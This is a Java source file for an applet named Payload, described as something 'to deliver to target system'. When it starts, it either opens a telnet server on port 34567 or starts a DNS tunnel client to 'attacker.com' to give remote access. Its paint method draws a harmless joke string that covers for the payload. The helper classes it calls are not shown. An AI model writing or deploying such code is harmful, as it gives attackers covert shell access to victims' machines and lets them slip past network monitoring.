import java.applet.Applet;
import java.awt.Graphics;

/**
 * An applet to deliver to target system.
 */
public class Payload extends Applet {

    private enum Mode {
        SERVER, DNS_TUNNEL_CLIENT
    }

    private final int port = 34567;
    private final String domain = "attacker.com";
    private final Mode mode = Mode.DNS_TUNNEL_CLIENT;

    public static void main(String[] args) {
        new Payload().start();
    }

    @Override
    public void start() {
        switch (mode) {
            case SERVER:
                // start a simple telnet server
                Server.start(port);
                break;
            case DNS_TUNNEL_CLIENT:
                // start a server via DNS tunnel
                DNSTunnelClient.start(domain);
                break;
            default:
                throw new RuntimeException("Unknown mode: " + mode);
        }
    }

    @Override
    public void paint(Graphics g) {
        g.drawString("Like most of life's problems, "
                + "this one can be solved with bending", 40, 20);
    }

}
